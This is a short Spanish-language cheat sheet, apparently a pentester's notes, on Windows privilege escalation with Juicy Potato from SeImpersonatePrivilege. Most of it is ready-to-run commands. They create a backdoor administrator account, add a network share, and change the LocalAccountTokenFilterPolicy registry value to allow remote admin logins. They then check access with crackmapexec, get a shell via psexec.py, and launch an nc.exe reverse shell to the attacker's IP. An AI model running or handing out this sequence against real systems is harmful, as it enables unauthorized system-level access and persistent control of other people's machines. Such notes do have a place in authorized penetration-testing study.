# Juicy Potato 

Cuando tenemos el Privilegio "Se Impersonate Privilege" en un Usuario, procedemos a usar Juicy Potato

# Sintaxis Creando un Nuevo Usuario a nivel de sistema
E introduciendolo en el grupo Admins

```bash
Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user paco paco1234$ /add"

Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators paco /add"
```

# Procedemos a comprobar el usuario con `Crackmapexec`
En busca del pwned, chequeamos...
```bash
crakmapexec smb IP -u paco -p paco123$

Ejemplo de lo que buscamos
# crackmapexec smb 192.168.177.10 -u administrator -p lab 
SMB         192.168.177.10  445    CLIENT251        [*] Windows 10 Pro 16299 (name:CLIENT251) (domain:corp.com) (signing:False) (SMBv1:True)
SMB         192.168.177.10  445    CLIENT251        [+] corp.com\administrator:lab (Pwn3d!)
```

Si NO resulta pwned procdemos a hacer lo siguiente

# Sintaxis creando un nuevo recurso compartido a nivel de red

Se Tenso por aqui
```bash
Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share paco_folder=C:\Windows\Temp\privilege /add"
```

# Modificando el Registro Oportuno

Para conseguir el Pwned y poder utilizar `PSEXEC.PY`
```bash
Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
```

# Psexec.py

Una vez seguidos los pasos el usiario Paco deberia estar Pwned y podriamos lanzarnos una Shell.
```bash
# psexec.py WORKGROUP/paco@10.11.1.13 cmd
```

# JuicyPotato para ejecutar un comando

En caso de que tuviesemos un nc.exe descargado, lanzarnos una RevShell
```bash
Juicy.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe -e cmd (OUR IP PORT)
```

Tambien esta el rottenpotato.exe que veremos mas adelante.
